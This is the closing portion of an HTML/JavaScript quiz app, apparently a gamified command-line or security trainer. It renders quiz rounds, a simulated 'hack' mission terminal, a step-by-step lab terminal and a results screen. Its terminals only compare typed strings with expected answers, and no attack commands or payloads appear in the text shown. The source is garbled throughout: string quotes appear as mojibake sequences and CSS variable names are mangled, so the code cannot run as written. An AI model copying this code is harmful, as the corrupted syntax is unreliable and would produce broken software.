shuffle(round.opts).forEach(function(opt){
var b=document.createElement(â€˜buttonâ€™);b.className=â€˜optâ€™;b.textContent=opt;
b.onclick=function(){if(answered)return;answered=true;
var correct=opt===round.a;correct?SFX.correct():SFX.wrong();
var bs=od.querySelectorAll(â€™.optâ€™);
for(var i=0;i<bs.length;i++){if(bs[i].textContent===round.a){bs[i].classList.add(â€˜correctâ€™);bs[i].classList.add(â€˜pulseâ€™)}else if(bs[i].textContent===opt&&!correct){bs[i].classList.add(â€˜wrongâ€™);bs[i].classList.add(â€˜shakeâ€™)}}
showFeedback(card,correct,round,advance);
};od.appendChild(b);
});card.appendChild(od);
}
// TF
else if(round.type===â€˜tfâ€™){
var answered=false;
card.innerHTML=â€™<div style="font-weight:600;font-size:.92rem;line-height:1.4">â€™+esc(round.q)+â€™</div>â€™;
addGloss(card,round.q);
var row=document.createElement(â€˜divâ€™);row.style.cssText=â€˜display:flex;gap:8pxâ€™;
[true,false].forEach(function(v){
var b=document.createElement(â€˜buttonâ€™);b.className=â€˜optâ€™;b.style.cssText=â€˜flex:1;text-align:center;font-weight:600â€™;b.textContent=v?â€™\u2705 Trueâ€™:â€™\u274C Falseâ€™;
b.onclick=function(){if(answered)return;answered=true;
var correct=v===round.a;correct?SFX.correct():SFX.wrong();
var bs=row.querySelectorAll(â€™.optâ€™);for(var i=0;i<bs.length;i++){var bv=bs[i].textContent.indexOf(â€˜Trueâ€™)!==-1;if(bv===round.a){bs[i].classList.add(â€˜correctâ€™);bs[i].classList.add(â€˜pulseâ€™)}else if(bv===v&&!correct){bs[i].classList.add(â€˜wrongâ€™);bs[i].classList.add(â€˜shakeâ€™)}}
showFeedback(card,correct,round,advance);
};row.appendChild(b);
});card.appendChild(row);
}
// TYPE / FILLIN
else if(round.type===â€˜typeâ€™||round.type===â€˜fillinâ€™){
var answered=false;
card.innerHTML=â€™<div style="font-weight:600;font-size:.92rem;line-height:1.4">â€™+esc(round.q)+â€™</div>â€™;
addGloss(card,round.q);
var inp=document.createElement(â€˜inputâ€™);inp.className=â€˜inpâ€™;inp.placeholder=â€˜Type your answerâ€¦â€™;inp.autocomplete=â€˜offâ€™;inp.autocapitalize=â€˜offâ€™;inp.spellcheck=false;
var btn=document.createElement(â€˜buttonâ€™);btn.className=â€˜btn fullâ€™;btn.textContent=â€˜Checkâ€™;
function doCheck(){if(answered||!inp.value.trim())return;answered=true;
var correct=false;for(var i=0;i<round.a.length;i++)if(inp.value.trim().toLowerCase()===round.a[i].toLowerCase()){correct=true;break}
correct?SFX.correct():SFX.wrong();card.classList.add(correct?â€˜glowâ€™:â€˜shakeâ€™);
if(!correct){var ans=document.createElement(â€˜divâ€™);ans.style.cssText=â€˜font-size:.82rem;color:var(â€“green);font-family:JetBrains Mono,monospace;padding:8px 12px;background:var(â€“bg);border-radius:8px;margin-top:4pxâ€™;ans.textContent=round.a[0];card.appendChild(ans)}
btn.style.display=â€˜noneâ€™;inp.disabled=true;
showFeedback(card,correct,round,advance);
}
inp.onkeydown=function(e){if(e.key===â€˜Enterâ€™)doCheck()};btn.onclick=doCheck;
card.appendChild(inp);card.appendChild(btn);w.appendChild(card);root.appendChild(w);setTimeout(function(){inp.focus()},100);return;
}
// ORDER
else if(round.type===â€˜orderâ€™){
var items=shuffle(round.items),answered=false;
card.innerHTML=â€™<div style="font-weight:600;font-size:.92rem;line-height:1.4">â€™+esc(round.q)+â€™</div>â€™;
var ld=document.createElement(â€˜divâ€™);
function drawOrd(){ld.innerHTML=â€™â€™;items.forEach(function(item,i){
var r=document.createElement(â€˜divâ€™);r.className=â€˜oiâ€™;
r.innerHTML=â€™<span style="color:var(--textDim);font-size:.78rem;width:20px;font-family:JetBrains Mono,monospace">â€™+(i+1)+â€™</span><span style="flex:1;font-size:.85rem">â€™+esc(item)+â€™</span>â€™;
var btns=document.createElement(â€˜divâ€™);btns.style.cssText=â€˜display:flex;flex-direction:column;gap:2pxâ€™;
var up=document.createElement(â€˜buttonâ€™);up.innerHTML=â€™â–²â€™;up.onclick=function(){if(answered||i===0)return;SFX.tap();var t=items[i];items[i]=items[i-1];items[i-1]=t;drawOrd()};
var dn=document.createElement(â€˜buttonâ€™);dn.innerHTML=â€™â–¼â€™;dn.onclick=function(){if(answered||i===items.length-1)return;SFX.tap();var t=items[i];items[i]=items[i+1];items[i+1]=t;drawOrd()};
btns.appendChild(up);btns.appendChild(dn);r.appendChild(btns);ld.appendChild(r);
})}
drawOrd();card.appendChild(ld);
var btn=document.createElement(â€˜buttonâ€™);btn.className=â€˜btn fullâ€™;btn.textContent=â€˜Check Orderâ€™;
btn.onclick=function(){if(answered)return;answered=true;
var correct=true;for(var i=0;i<items.length;i++)if(items[i]!==round.items[i]){correct=false;break}
correct?SFX.correct():SFX.wrong();card.classList.add(correct?â€˜pulseâ€™:â€˜shakeâ€™);
if(!correct)setTimeout(function(){items=round.items.slice();drawOrd()},600);
btn.style.display=â€˜noneâ€™;showFeedback(card,correct,round,advance);
};card.appendChild(btn);
}
// MATCH
else if(round.type===â€˜matchâ€™){
var sel=null,selSide=null,matched={},rMatched={},complete=false;
var leftItems=round.pairs.map(function(p){return p[0]});
var rightItems=shuffle(round.pairs.map(function(p){return p[1]}));
card.innerHTML=â€™<div style="font-weight:600;font-size:.92rem;line-height:1.4">â€™+esc(round.q)+â€™</div><div style="font-size:.72rem;color:var(--textDim)">Tap any item, then tap its match</div>â€™;
var grid=document.createElement(â€˜divâ€™);grid.style.cssText=â€˜display:grid;grid-template-columns:1fr 1fr;gap:8pxâ€™;
var lc=document.createElement(â€˜divâ€™);lc.className=â€˜gapâ€™;var rc=document.createElement(â€˜divâ€™);rc.className=â€˜gapâ€™;
function tryMatch(a,aSide,b,bSide){
var left=aSide===â€˜Lâ€™?a:b,right=aSide===â€˜Lâ€™?b:a;
var pair=null;for(var i=0;i<round.pairs.length;i++)if(round.pairs[i][0]===left&&round.pairs[i][1]===right)pair=round.pairs[i];
if(pair){matched[left]=right;rMatched[right]=left;sel=null;selSide=null;SFX.tap();
var mc=0;for(var k in matched)mc++;
if(mc===round.pairs.length){complete=true;SFX.correct();showFeedback(card,true,round,advance)}drawM();
}else{SFX.wrong();sel=null;selSide=null;drawM()}
}
function drawM(){lc.innerHTML=â€™â€™;rc.innerHTML=â€™â€™;
leftItems.forEach(function(item){
var done=!!matched[item],isSel=sel===item&&selSide===â€˜Lâ€™;
var d=document.createElement(â€˜divâ€™);d.className=â€˜miâ€™;
d.style.borderColor=done?â€˜var(â€“green)â€™:isSel?â€˜var(â€“blue)â€™:â€˜var(â€“border)â€™;
d.style.background=done?â€˜var(â€“greenDim)â€™:isSel?â€˜var(â€“blueDim)â€™:â€˜var(â€“card2)â€™;d.style.color=done?â€˜var(â€“green)â€™:â€˜var(â€“text)â€™;
d.textContent=(done?â€™\u2713 â€˜:â€™â€™)+item;
if(!done&&!complete)d.onclick=function(){SFX.tap();
if(sel&&selSide===â€˜Râ€™){tryMatch(sel,â€˜Râ€™,item,â€˜Lâ€™)}
else if(sel===item&&selSide===â€˜Lâ€™){sel=null;selSide=null;drawM()}
else{sel=item;selSide=â€˜Lâ€™;drawM()}
};lc.appendChild(d);
});
rightItems.forEach(function(item){
var done=!!rMatched[item],isSel=sel===item&&selSide===â€˜Râ€™;
var d=document.createElement(â€˜divâ€™);d.className=â€˜miâ€™;
d.style.borderColor=done?â€˜var(â€“green)â€™:isSel?â€˜var(â€“blue)â€™:â€˜var(â€“border)â€™;
d.style.background=done?â€˜var(â€“greenDim)â€™:isSel?â€˜var(â€“blueDim)â€™:â€˜var(â€“card2)â€™;d.style.color=done?â€˜var(â€“green)â€™:â€˜var(â€“text)â€™;
d.textContent=(done?â€™\u2713 â€˜:â€™â€™)+item;
if(!done&&!complete)d.onclick=function(){SFX.tap();
if(sel&&selSide===â€˜Lâ€™){tryMatch(sel,â€˜Lâ€™,item,â€˜Râ€™)}
else if(sel===item&&selSide===â€˜Râ€™){sel=null;selSide=null;drawM()}
else{sel=item;selSide=â€˜Râ€™;drawM()}
};rc.appendChild(d);
});}
drawM();grid.appendChild(lc);grid.appendChild(rc);card.appendChild(grid);
}
// BUILD
else if(round.type===â€˜buildâ€™){
var built=[],avail=shuffle(round.parts.slice()),answered=false;
card.innerHTML=â€™<div style="font-weight:600;font-size:.92rem;line-height:1.4">â€™+esc(round.q)+â€™</div>â€™;
var bd=document.createElement(â€˜divâ€™);bd.style.cssText=â€˜min-height:44px;background:var(â€“bg);border-radius:10px;padding:10px;display:flex;flex-wrap:wrap;gap:6px;font-family:JetBrains Mono,monospace;font-size:.8remâ€™;
var ad=document.createElement(â€˜divâ€™);ad.style.cssText=â€˜display:flex;flex-wrap:wrap;gap:6pxâ€™;
var ck=document.createElement(â€˜buttonâ€™);ck.className=â€˜btn fullâ€™;ck.textContent=â€˜Checkâ€™;ck.style.display=â€˜noneâ€™;
function drawB(){bd.innerHTML=â€™â€™;ad.innerHTML=â€™â€™;
if(!built.length)bd.innerHTML=â€™<span style="color:var(--textDim)">Tap parts to buildâ€¦</span>â€™;
built.forEach(function(p,i){var s=document.createElement(â€˜spanâ€™);s.style.cssText=â€˜background:var(â€“card2);padding:5px 10px;border-radius:6px;cursor:pointer;border:1px solid var(â€“border)â€™;s.textContent=p;s.onclick=function(){if(answered)return;avail.push(built[i]);built.splice(i,1);drawB()};bd.appendChild(s)});
avail.forEach(function(p,i){var b=document.createElement(â€˜buttonâ€™);b.className=â€˜btn sm secâ€™;b.style.cssText=â€˜font-family:JetBrains Mono,monospace;font-size:.78remâ€™;b.textContent=p;b.onclick=function(){if(answered)return;SFX.tap();built.push(avail[i]);avail.splice(i,1);drawB()};ad.appendChild(b)});
ck.style.display=built.length&&!answered?â€™â€™:â€˜noneâ€™;
}
ck.onclick=function(){if(answered)return;answered=true;
var correct=built.join(â€™ â€˜)===round.answer.join(â€™ â€˜);correct?SFX.correct():SFX.wrong();card.classList.add(correct?â€˜glowâ€™:â€˜shakeâ€™);
if(!correct){var ans=document.createElement(â€˜divâ€™);ans.style.cssText=â€˜font-size:.82rem;color:var(â€“green);font-family:JetBrains Mono,monospace;padding:8px 12px;background:var(â€“bg);border-radius:8pxâ€™;ans.textContent=round.answer.join(â€™ â€˜);card.appendChild(ans)}
ck.style.display=â€˜noneâ€™;showFeedback(card,correct,round,advance);
};
drawB();card.appendChild(bd);card.appendChild(ad);card.appendChild(ck);
}
// SCENARIO
else if(round.type===â€˜scenarioâ€™){
var answered=false;
card.innerHTML=â€™<div style="font-size:.68rem;color:var(--gold);font-weight:700;text-transform:uppercase;letter-spacing:1.5px">\uD83C\uDFAD SCENARIO</div>â€™;
card.innerHTML+=â€™<div style="font-weight:600;font-size:.92rem;line-height:1.4;padding:10px 14px;background:var(--bg2);border-radius:8px;border-left:2px solid var(--gold)">â€™+esc(round.situation)+â€™</div>â€™;
card.innerHTML+=â€™<div style="font-size:.85rem;color:var(--text2)">â€™+esc(round.q)+â€™</div>â€™;
var od=document.createElement(â€˜divâ€™);
shuffle(round.opts).forEach(function(opt){
var b=document.createElement(â€˜buttonâ€™);b.className=â€˜optâ€™;b.textContent=opt;
b.onclick=function(){if(answered)return;answered=true;
var correct=opt===round.a;correct?SFX.correct():SFX.wrong();
var bs=od.querySelectorAll(â€™.optâ€™);
for(var i=0;i<bs.length;i++){if(bs[i].textContent===round.a){bs[i].classList.add(â€˜correctâ€™);bs[i].classList.add(â€˜pulseâ€™)}else if(bs[i].textContent===opt&&!correct){bs[i].classList.add(â€˜wrongâ€™);bs[i].classList.add(â€˜shakeâ€™)}}
showFeedback(card,correct,round,advance);
};od.appendChild(b);
});card.appendChild(od);
}
// HACK â€” mini terminal mission
else if(round.type===â€˜hackâ€™){
var answered=false;
card.style.borderLeft=â€˜3px solid var(â€“green)â€™;
card.innerHTML=â€™<div style="font-size:.68rem;color:var(--green);font-weight:700;text-transform:uppercase;letter-spacing:1.5px">\uD83D\uDCBB MISSION</div>â€™;
var story=document.createElement(â€˜divâ€™);story.style.cssText=â€˜font-size:.88rem;line-height:1.5;color:var(â€“text2);padding:8px 12px;background:var(â€“bg2);border-radius:8px;margin:4px 0â€™;story.textContent=round.story;card.appendChild(story);
var prompt=document.createElement(â€˜divâ€™);prompt.style.cssText=â€˜font-size:.85rem;font-weight:600;margin:6px 0 4pxâ€™;prompt.textContent=round.q;card.appendChild(prompt);
addGloss(card,round.story+â€™ â€˜+round.q);
var termWrap=document.createElement(â€˜divâ€™);termWrap.className=â€˜labtermâ€™;termWrap.style.maxHeight=â€˜80pxâ€™;termWrap.style.minHeight=â€˜40pxâ€™;
termWrap.innerHTML=â€™<div class="p">$ <span id="hackCmd" style="opacity:.3">waitingâ€¦</span></div>â€™;card.appendChild(termWrap);
var lr=document.createElement(â€˜divâ€™);lr.style.cssText=â€˜display:flex;gap:6px;align-items:center;margin-top:6pxâ€™;
lr.innerHTML=â€™<span style="color:var(--green);font-family:JetBrains Mono,monospace;font-size:.8rem">$</span>â€™;
var inp=document.createElement(â€˜inputâ€™);inp.className=â€˜inpâ€™;inp.style.cssText=â€˜flex:1;font-size:.8rem;padding:10px 12pxâ€™;inp.placeholder=â€˜Type commandâ€¦â€™;inp.autocomplete=â€˜offâ€™;inp.autocapitalize=â€˜offâ€™;inp.spellcheck=false;
var btn=document.createElement(â€˜buttonâ€™);btn.className=â€˜btn smâ€™;btn.textContent=â€˜Runâ€™;
function runHack(){if(answered||!inp.value.trim())return;answered=true;
var cmd=inp.value.trim();
var correct=false;for(var i=0;i<round.a.length;i++)if(cmd.toLowerCase().replace(/\s+/g,â€™ â€˜)===round.a[i].toLowerCase()){correct=true;break}
// Partial match: must be at least 60% of the expected command
if(!correct)for(var i=0;i<round.a.length;i++){var a=round.a[i].toLowerCase(),c=cmd.toLowerCase();if(c.length>=a.length*.6&&(a.indexOf(c)!==-1||c.indexOf(a)!==-1)){correct=true;break}}
var cmdEl=document.getElementById(â€˜hackCmdâ€™);if(cmdEl){cmdEl.textContent=cmd;cmdEl.style.opacity=â€˜1â€™}
termWrap.style.maxHeight=â€˜200pxâ€™;
if(correct){
SFX.correct();
var out=document.createElement(â€˜divâ€™);out.className=â€˜oâ€™;out.textContent=round.output;termWrap.appendChild(out);
var suc=document.createElement(â€˜divâ€™);suc.className=â€˜sâ€™;suc.textContent=â€™\u2705 â€˜+round.success;termWrap.appendChild(suc);
card.classList.add(â€˜glowâ€™);
}else{
SFX.wrong();
var fail=document.createElement(â€˜divâ€™);fail.className=â€˜fâ€™;fail.textContent=â€˜bash: â€˜+cmd+â€™: command not recognized in this contextâ€™;termWrap.appendChild(fail);
var hint=document.createElement(â€˜divâ€™);hint.className=â€˜hâ€™;hint.textContent=â€™\uD83D\uDCA1 Try: â€˜+round.a[0];termWrap.appendChild(hint);
}
inp.disabled=true;btn.style.display=â€˜noneâ€™;
showFeedback(card,correct,round,advance);
termWrap.scrollTop=termWrap.scrollHeight;
}
inp.onkeydown=function(e){if(e.key===â€˜Enterâ€™)runHack()};btn.onclick=runHack;
lr.appendChild(inp);lr.appendChild(btn);card.appendChild(lr);
if(round.quickCmds){var qr=document.createElement(â€˜divâ€™);qr.style.cssText=â€˜display:flex;flex-wrap:wrap;gap:4px;margin-top:4pxâ€™;
round.quickCmds.forEach(function(c){var b=document.createElement(â€˜buttonâ€™);b.className=â€˜btn sm secâ€™;b.style.cssText=â€˜font-family:JetBrains Mono,monospace;font-size:.68rem;padding:3px 7pxâ€™;b.textContent=c;b.onclick=function(){inp.value=c;inp.focus()};qr.appendChild(b)});card.appendChild(qr)}
w.appendChild(card);root.appendChild(w);setTimeout(function(){inp.focus()},100);return;
}
// LAB
else if(round.type===â€˜labâ€™){
var step=0,labDone=false,steps=round.steps,cur=steps[0];
card.style.borderColor=â€™#1a3a1aâ€™;
card.innerHTML=â€™<div style="display:flex;justify-content:space-between;align-items:center"><div style="font-size:.68rem;color:var(--green);font-weight:700;text-transform:uppercase;letter-spacing:1.5px">\uD83D\uDDA5\uFE0F LAB: â€˜+esc(round.title)+â€™</div><span class="badge badge-level" id="labstep">1/â€™+steps.length+â€™</span></div>â€™;
card.innerHTML+=â€™<div style="background:var(--card2);border:1px solid var(--border);border-radius:10px;padding:10px 14px;font-size:.85rem"><strong style="color:var(--cyan)">\uD83C\uDFAF</strong> â€˜+esc(round.objective)+â€™</div>â€™;
var term=document.createElement(â€˜divâ€™);term.className=â€˜labtermâ€™;
if(round.banner){var bd2=document.createElement(â€˜divâ€™);bd2.className=â€˜oâ€™;bd2.textContent=round.banner;term.appendChild(bd2)}
function addLn(c,t){var d=document.createElement(â€˜divâ€™);d.className=c;d.textContent=t;term.appendChild(d);term.scrollTop=term.scrollHeight}
addLn(â€˜hâ€™,â€™\u27A1\uFE0F Step 1/â€™+steps.length+â€™: â€˜+cur.hint);card.appendChild(term);
var lr=document.createElement(â€˜divâ€™);lr.style.cssText=â€˜display:flex;gap:6px;align-items:center;margin-top:8pxâ€™;
lr.innerHTML=â€™<span style="color:var(--green);font-family:JetBrains Mono,monospace;font-size:.8rem">$</span>â€™;
var li2=document.createElement(â€˜inputâ€™);li2.className=â€˜inpâ€™;li2.style.cssText=â€˜flex:1;font-size:.8rem;padding:10px 12pxâ€™;li2.placeholder=cur.placeholder||â€˜Type commandâ€¦â€™;li2.autocomplete=â€˜offâ€™;li2.autocapitalize=â€˜offâ€™;li2.spellcheck=false;
var lb=document.createElement(â€˜buttonâ€™);lb.className=â€˜btn smâ€™;lb.textContent=â€˜Runâ€™;
function runC(){if(labDone||!li2.value.trim())return;var cmd=li2.value.trim();li2.value=â€™â€™;addLn(â€˜pâ€™,â€™$ â€˜+cmd);cur=steps[step];
var ok=false;for(var i=0;i<cur.accept.length;i++){var a=cur.accept[i];if(a.charAt(0)===â€™~â€™){if(cmd.toLowerCase().indexOf(a.slice(1).toLowerCase())!==-1){ok=true;break}}else if(cmd.toLowerCase().replace(/\s+/g,â€™ â€˜)===a.toLowerCase()){ok=true;break}}
if(ok){SFX.correct();addLn(â€˜oâ€™,cur.output);if(cur.successMsg)addLn(â€˜sâ€™,â€™\u2705 â€˜+cur.successMsg);
if(step+1>=steps.length){addLn(â€˜sâ€™,â€™\n\uD83C\uDF89 Lab Complete!â€™);labDone=true;SFX.complete();li2.disabled=true;
var nb=document.createElement(â€˜buttonâ€™);nb.className=â€˜btn fullâ€™;nb.style.marginTop=â€˜8pxâ€™;nb.textContent=â€˜Finish Lab \u2192â€™;nb.onclick=function(){advance(true)};card.appendChild(nb);
}
else{step++;cur=steps[step];addLn(â€˜hâ€™,â€™\n\u27A1\uFE0F Step â€˜+(step+1)+â€™/â€™+steps.length+â€™: â€˜+cur.hint);var ls2=document.getElementById(â€˜labstepâ€™);if(ls2)ls2.textContent=(step+1)+â€™/â€™+steps.length;drawQC()}
}else{SFX.wrong();addLn(â€˜fâ€™,cur.wrongMsg||â€˜Not quite. Try again.â€™);if(cur.example)addLn(â€˜hâ€™,â€™\uD83D\uDCA1 Try: â€˜+cur.example)}
}
li2.onkeydown=function(e){if(e.key===â€˜Enterâ€™)runC()};lb.onclick=runC;
lr.appendChild(li2);lr.appendChild(lb);card.appendChild(lr);
var qr=document.createElement(â€˜divâ€™);qr.id=â€˜labqcâ€™;qr.style.cssText=â€˜display:flex;flex-wrap:wrap;gap:4px;margin-top:6pxâ€™;card.appendChild(qr);
function drawQC(){
qr.innerHTML=â€™â€™;
if(cur.quickCmds){cur.quickCmds.forEach(function(c){var b=document.createElement(â€˜buttonâ€™);b.className=â€˜btn sm secâ€™;b.style.cssText=â€˜font-family:JetBrains Mono,monospace;font-size:.7rem;padding:4px 8pxâ€™;b.textContent=c;b.onclick=function(){li2.value=c;li2.focus()};qr.appendChild(b)})}
}
drawQC();
}
w.appendChild(card);root.appendChild(w);
}
function renderResult(){
var level=null;for(var i=0;i<ALL_LEVELS.length;i++)if(ALL_LEVELS[i].id===S.activeId){level=ALL_LEVELS[i];break}
if(!level){S.screen=â€˜mapâ€™;render();return}
// Score based on original rounds only (not recycled ones)
var origRounds=level.rounds.filter(function(r){return r.type!==â€˜teachâ€™});
var correct=0;for(var si=0;si<origRounds.length&&si<S.scores.length;si++){if(S.scores[si])correct++}
var total=origRounds.length,pctC=total>0?correct/total:1;
// Masters levels require 100%, all others require 80%
var isMasters=level.isMasters||false;
var passThreshold=isMasters?1.0:0.8;
var passed=pctC>=passThreshold,stars=pctC>=.95?3:pctC>=.85?2:1;
if(passed)SFX.levelup();
var w=document.createElement(â€˜divâ€™);w.className=â€˜hpâ€™;w.style.cssText=â€˜display:flex;flex-direction:column;justify-content:center;align-items:center;min-height:100vh;min-height:100dvh;padding:20pxâ€™;
var card=document.createElement(â€˜divâ€™);card.className=â€˜card fadeIn gapâ€™;card.style.cssText=â€˜text-align:center;width:100%â€™;
var displayName=(S.user&&S.user!==â€˜guestâ€™)?esc(S.user):â€™â€™;
card.innerHTML=â€™<div style="font-size:1.8rem;font-weight:800;margin-top:12px">â€™+(passed?â€™\uD83C\uDF89 Level Complete!â€™:â€™\uD83D\uDCAA Almost \u2014 try again!â€™)+â€™</div>â€™;
card.innerHTML+=â€™<div style="color:var(--text2);font-size:1rem;margin-top:4px">â€™+correct+â€™/â€™+total+â€™ correctâ€™+(total===0?â€™ (info only)â€™:â€™â€™)+â€™</div>â€™;
if(passed&&total>0){
var starMsg=stars===3?â€˜Perfect runâ€™:stars===2?â€˜Great jobâ€™:â€˜Passedâ€™;
if(displayName)starMsg+=â€™, â€˜+displayName+â€™!â€™; else starMsg+=â€™!â€™;
var sr=document.createElement(â€˜divâ€™);sr.style.cssText=â€˜display:flex;gap:12px;justify-content:center;margin:12px 0â€™;
for(var s=1;s<=3;s++){var sp=document.createElement(â€˜spanâ€™);sp.style.cssText=â€˜font-size:2.5rem;animation-delay:â€™+s*.15+â€˜s;opacity:â€™+(s<=stars?1:.15);if(s<=stars)sp.className=â€˜starPopâ€™;sp.textContent=â€™\u2B50â€™;sr.appendChild(sp)}
card.appendChild(sr);
var sm=document.createElement(â€˜divâ€™);sm.style.cssText=â€˜font-size:.95rem;color:var(â€“text2);font-weight:600;margin-bottom:4pxâ€™;sm.textContent=starMsg;card.appendChild(sm);
}
if(passed){var xpd=document.createElement(â€˜divâ€™);xpd.style.cssText=â€˜font-size:1.1rem;color:var(â€“green);font-weight:700;margin:8px 0â€™;xpd.textContent=â€™+â€™+Math.max(correct*10,10)+â€™ XPâ€™;card.appendChild(xpd);
// XP toast
var toast=document.createElement(â€˜divâ€™);toast.className=â€˜xp-toastâ€™;toast.textContent=â€™+â€™+Math.max(correct*10,10)+â€™ XPâ€™;document.body.appendChild(toast);setTimeout(function(){if(toast.parentNode)toast.parentNode.removeChild(toast)},2000);
}
else{var nd=document.createElement(â€˜divâ€™);nd.style.cssText=â€˜font-size:.9rem;color:var(â€“textDim);margin:8px 0â€™;nd.textContent=â€˜Need â€˜+(isMasters?â€˜100â€™:â€˜80â€™)+â€™% to passâ€™;card.appendChild(nd)}
if(level.title){var lt=document.createElement(â€˜divâ€™);lt.style.cssText=â€˜font-size:.8rem;color:var(â€“textDim);margin-bottom:8pxâ€™;lt.textContent=level.title;card.appendChild(lt)}
var btn=document.createElement(â€˜buttonâ€™);btn.className=â€˜btn fullâ€™;btn.style.cssText=â€˜padding:14px;font-size:1rem;margin-top:4pxâ€™;btn.textContent=passed?â€˜Continueâ€™:â€˜Retryâ€™;
btn.onclick=function(){if(passed){var old=S.progress[S.activeId]||{};S.progress[S.activeId]={passed:true,stars:Math.max(stars,old.stars||0),xp:Math.max(correct*10,old.xp||0)};saveP(S.user,S.progress)}if(S.missed&&S.missed.length)saveWeak(S.user,S.missed);S.screen=â€˜mapâ€™;render()};
card.appendChild(btn);
document.onkeydown=function(e){if(e.key===â€˜Enterâ€™){e.preventDefault();document.onkeydown=null;btn.click()}};
if(passed){var again=document.createElement(â€˜buttonâ€™);again.className=â€˜btn sec fullâ€™;again.style.padding=â€˜12pxâ€™;again.textContent=â€˜Practice Againâ€™;again.onclick=function(){startLesson(S.activeId)};card.appendChild(again)}
if(passed&&S.user===â€˜guestâ€™){var gn=document.createElement(â€˜divâ€™);gn.style.cssText=â€˜font-size:.78rem;color:var(â€“gold);text-align:center;margin-top:10pxâ€™;gn.textContent=â€™\u26A0\uFE0F This progress won\u2019t be saved \u2014 create an account in Settingsâ€™;card.appendChild(gn)}
w.appendChild(card);root.appendChild(w);
}

// === BOOT ===
render();
</script>

</body>
</html>
